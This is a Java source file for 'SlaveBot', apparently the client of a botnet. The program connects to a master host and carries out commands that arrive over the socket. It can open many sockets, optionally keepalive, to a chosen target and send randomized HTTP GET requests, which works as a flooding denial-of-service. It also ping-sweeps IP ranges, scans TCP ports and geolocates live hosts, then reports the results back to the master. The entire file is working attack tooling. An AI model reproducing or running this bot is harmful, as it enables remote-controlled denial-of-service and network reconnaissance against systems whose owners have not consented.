
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.ClassNotFoundException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;
import java.util.Iterator;
import java.util.Set;
import java.lang.Thread;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.Random;
import java.util.UUID;
import java.io.*;
import java.net.*;
import java.lang.*;

public class SlaveBot
{
	public static ArrayList<Socket> soc = new ArrayList<Socket>();
	public static ArrayList<Socket> soc_close = new ArrayList<Socket>();
	public static void main(String[] args) throws IOException, ClassNotFoundException
	{
		ObjectOutputStream oos = null;
		ObjectInputStream ois = null;
		String ip =args[1];
		int port=Integer.parseInt(args[3]);
		
		Socket socket = null;
		Socket s = null;
		socket = new Socket(ip, port);
		
		String check_str="";
		String check2_str="";
		String url_req="";
		String rand="";
		String tIP;
		String cmd;
		String host;
		int tpno = -1;
		
		
		
		 try 
		 {
			 while(true)
			 {
				 	
				
			  	
				 BufferedReader rdr = new BufferedReader(new InputStreamReader(socket.getInputStream()));
			        
			        String msg = rdr.readLine();
			        
			        String tempmsg = msg;
				System.out.println(tempmsg);
		    		String[] splitmsg =tempmsg.split("\\s+");
		    		int arguments = splitmsg.length;
				System.out.println(arguments);
		    		cmd = splitmsg[0];
				host = splitmsg[1];
		    		//tIP = splitmsg[2];
				
							        	
		    			
		    			
			        if(cmd.equals("connect"))
			        {
			        	try
			        	{
						tIP = splitmsg[2];
						int con = 1 ;
						tpno = Integer.parseInt(splitmsg[3]);
						if(arguments>=4)
			        		{
							if(arguments == 4)
							{
								con = 1;
								check_str = "";
							}
							else if (arguments > 4)
							{
							  int arg = arguments - 4;
						          int count = 4;
							  while(arg>0)
							  {
								
								String temp = splitmsg[count];
								if(temp.equals("keepalive"))
								{
									check_str = splitmsg[count];
									
								}
								else if(temp.contains("url"))
								{
									check2_str = splitmsg[count];
									
									//System.out.println(check_str);
								}
								else	
								{
									con = Integer.parseInt(splitmsg[count]);
									//System.out.println(con);
								}	
									arg--;
									count++;
							  }
								
							}
			        			
										        		}
						else
						{
							System.out.println("invalid syntax");
						}
						
						
			        		for(int i=0;i<con;i++)
						{
							//System.out.println("inside for"+con);
			        			s = new Socket(tIP, tpno);
							soc.add(s);
							
							
			        	if(check_str.equals("keepalive"))
					{
						
						s.setKeepAlive(true);
						//System.out.println("Socket Alive: "+ newsock.getKeepAlive());
					}
					
					if(check2_str.equals("url=/#q="))
					{
						//System.out.println("Inside url");
												
						String[] splitStr = check2_str.split("/");
						String ab = splitStr[0];
						String b = splitStr[1];
						
						char[] chars = "abcdefghijklmnopqrstuvwxyz".toCharArray();
						StringBuilder sb = new StringBuilder();
						int size;
						Random random = new Random();
						size= random.nextInt(10);
						
						for (int j = 1; j < size; j++) 
						{
   					 		char c = chars[random.nextInt(chars.length)];
    							sb.append(c);
						}
						rand = sb.toString();
						
						url_req = splitmsg[2]+"/"+b+rand;
						
						
						PrintWriter write = new PrintWriter(s.getOutputStream());
						write.println("GET "+url_req+ " HTTP/1.1\n");
						write.flush();
						System.out.println("Sent HTTP request");
						BufferedReader bufrd = new BufferedReader(new InputStreamReader(s.getInputStream()));
						
						String read;
						System.out.println(read = bufrd.readLine());
						
						//bufrd.reset();
						//bufrd.close();
						
						}
			        			
						}//end of for
						
			        	}catch(Exception e)
						{
							e.printStackTrace();
						}
			        
			        }//end of connect

			        
			        if(cmd.equals("disconnect"))
			        {
			        	try
			        	{
						tIP = splitmsg[2];
						System.out.println("Inside disconnect");
						if(arguments == 4)
						{
						tpno = Integer.parseInt(splitmsg[3]);
						}
						else
						{
							tpno = -1;
							System.out.println("tpno :"+tpno);
						}
						for(Socket ss : soc)
						{
							
							String destination_addr = InetAddress.getByName(tIP).getHostAddress();
							String destination = ss.getInetAddress().getHostAddress().toString();
							Integer portno = new Integer(ss.getPort());
							String destination_port = portno.toString();
							System.out.println("destination address from sender"+destination_addr);
							System.out.println("destination address "+destination);
							System.out.println("destination port"+destination_port);
							if(destination_addr.equals(destination))
							{
								System.out.println("Inside if 1");
								if((tpno == -1) || (tpno == portno))
								{
									System.out.println("Inside if 2");
									ss.close();
									soc_close.add(ss);
								}
							}
						}
						soc.removeAll(soc_close);	        		
			        	}catch(IOException e) 
					{
						e.printStackTrace();
					} 

								        
			        }//end of disconnect

			if(cmd.equals("ipscan"))
			{
				try
				{
					System.out.println("Inside ipscan");
					String ipRange[] = splitmsg[2].split("-"); 
					String firstIP	= ipRange[0];
					String secondIP	= ipRange[1];
					InetAddress obj1 = InetAddress.getByName(firstIP);
					InetAddress obj2 = InetAddress.getByName(secondIP);
					long first_int = 0;  
					long second_int = 0;  
					for (byte b: obj1.getAddress())  
					{  
    						first_int = first_int << 8 | (b & 0xFF);  
					}
					for (byte b: obj2.getAddress())  
					{  
    						second_int = second_int << 8 | (b & 0xFF);  
					}
					
					String printStr = "";
					ArrayList<String> ipList = new ArrayList<String>();
					System.out.println("reconverted ip list");	
					for(long i = first_int; i <= second_int; i++)
					{
						String ip_to_add = SlaveBot.integerToStringIP(i);
						System.out.println(ip_to_add);
						ipList.add(ip_to_add);		
					}
					ArrayList<String> ipAdds = new ArrayList<String>();
					OutputStream outstream = socket.getOutputStream(); 
						PrintWriter out = new PrintWriter(outstream,true);
						String os_name = System.getProperties().getProperty("os.name");
						
					for(String individualIp : ipList)
					{
						//System.out.println("inside for");
						Process processObj = null;
						
						if(os_name.contains("OS") || os_name.startsWith("Linux")||os_name.contains("Mac"))
						{
							if(os_name.startsWith("Linux"))
							{
								processObj = Runtime.getRuntime().exec("ping -c 2 -w 5 " + individualIp);
							}
							else if(os_name.contains("Mac"))
							{
								processObj = Runtime.getRuntime().exec("ping -c 2 -W 5000 " + individualIp);
							}
						}
						else if(os_name.startsWith("Windows"))
						{
							processObj = Runtime.getRuntime().exec("ping -n 2 -w 5000 " + individualIp);
						}
						

						
						BufferedReader bufrdr = new BufferedReader(new InputStreamReader(processObj.getInputStream()));
						String output = "";
						
						boolean isReachable = true;
				        int result = processObj.waitFor();
				        isReachable=(result==0);
				        
						if(isReachable) 
						{
							printStr += individualIp + ",";
							ipAdds.add(individualIp);
						}
					}
					int len = printStr.length();
					
					if(len != 0)
					{
						printStr = printStr.substring(0, len - 1);
						System.out.println(printStr);
						
					}
					else
					{
						printStr+="**Not Reachable**";
						System.out.println(printStr);
					}
					printStr+="\r";
					out.write(printStr);
					out.flush();					
					
					
					

				}
				catch(Exception e) 
				{
						e.printStackTrace();
				} 

			}//end of tcpscan

			 if(cmd.equals("tcpportscan"))
			{
					System.out.println("Inside tcpportscan");
					if(arguments == 4)
					{
						String target = splitmsg[2];
						String port_range = splitmsg[3];
						String port_arr[]=port_range.split("-");
						int first_port = Integer.parseInt(port_arr[0]);
						int last_port = Integer.parseInt(port_arr[1]);
						String portStr = new String("");
												
						OutputStream outstream = socket.getOutputStream(); 
						PrintWriter out = new PrintWriter(outstream,true);
						

						for(int j = first_port; j<= last_port; j++)
						{
							try
							{

							Socket so = new Socket(); 
								so.connect(new InetSocketAddress(target, j), 500);
								System.out.println("adding  "+j);
								//so.setSoTimeout(5000);
								portStr += Integer.toString(j) + ",";
							
							so.close();
							}
							catch(Exception e) 
							{
							//e.printStackTrace();
							} 
							System.out.println(j);
							
						}
						int len = portStr.length();
						
						if(len != 0)
						{
							portStr = portStr.substring(0, len - 1);
							System.out.println(portStr);
							
						}
						else
						{
							portStr+="**Not Reachable**";
							System.out.println(portStr);
						}
						portStr+="\r";
						out.write(portStr);
						out.flush();
						
						
					}
					else
					{
						System.out.println("error");
					}


						
				
			}//end of tcpportscan
			 
			 if(cmd.equals("geoipscan"))
			 {
				 	System.out.println("Inside tcpportscan");
				 	OutputStream outstream = socket.getOutputStream(); 
					PrintWriter out = new PrintWriter(outstream,true);
					ArrayList<String> ipList = new ArrayList<String>();
					ArrayList<String> ping_response = new ArrayList<String>();
					String loc = "";
					
					String ipRange[] = splitmsg[2].split("-"); 
					String firstIP	= ipRange[0];
					String secondIP	= ipRange[1];
					InetAddress obj1 = InetAddress.getByName(firstIP);
					InetAddress obj2 = InetAddress.getByName(secondIP);
					long first_int = 0;  
					long second_int = 0;  
					for (byte b: obj1.getAddress())  
					{  
 						first_int = first_int << 8 | (b & 0xFF);  
					}
					for (byte b: obj2.getAddress())  
					{  
 						second_int = second_int << 8 | (b & 0xFF);  
					}
					
					
					for(long i = first_int; i <= second_int; i++)
					{
						String ip_to_add = SlaveBot.integerToStringIP(i);
						System.out.println(ip_to_add);
						ipList.add(ip_to_add);		
					}
					
					
					
					String os_name = System.getProperties().getProperty("os.name");
					for(String individualIp : ipList)
					{
						
						Process processObj = null;
						
						if(os_name.contains("OS") || os_name.startsWith("Linux")||os_name.contains("Mac"))
						{
							if(os_name.startsWith("Linux"))
							{
								processObj = Runtime.getRuntime().exec("ping -c 2 -w 5 " + individualIp);
							}
							else if(os_name.contains("Mac"))
							{
								processObj = Runtime.getRuntime().exec("ping -c 2 -W 5000 " + individualIp);
							}
						}
						else if(os_name.startsWith("Windows"))
						{
							processObj = Runtime.getRuntime().exec("ping -n 2 -w 5000 " + individualIp);
						}
						
						boolean isReachable = true;
				        int result = processObj.waitFor();
				        isReachable=(result==0);
				        
						if(isReachable) 
						{
							ping_response.add(individualIp);
						}
					}
					
                 
					for(String geoip : ping_response)
					{

						String geoTest = "http://ip-api.com/csv/" + geoip;
						
						URL web = new URL(geoTest);
						BufferedReader in = new BufferedReader(new InputStreamReader(web.openStream()));
						String recv_data = "";

						loc += geoip;
						recv_data = in.readLine();
                        
							
                            String arr[] = recv_data.split(",");
                            for(int i =1 ; i < arr.length-1; i++)
                            {
                                loc+= " "+arr[i];
                                
                            }
                            
						loc+=":";				
					}
					
					if(loc.length() != 0)
                    {

						loc = loc.substring(0, loc.length() - 1);

					}
                     if (loc.isEmpty())
                     {
                         String str = "**Not Reachable**";  
                     str+= "\r";
                     out.println(str);
                     }
                     else
                     {
					loc += "\r";
					out.println(loc);
                     }
                 
					
			 }//end of geoipscan

			 }//end of while
			        
		 } //end of try
		 catch (Exception e) 
		 {
			 
		 }
        
	}//end of main

public static String integerToStringIP(long ip) 
{
        return ((ip >> 24 ) & 0xFF) + "." +

               ((ip >> 16 ) & 0xFF) + "." +

               ((ip >>  8 ) & 0xFF) + "." +

               ( ip        & 0xFF);
    }


}//end of class

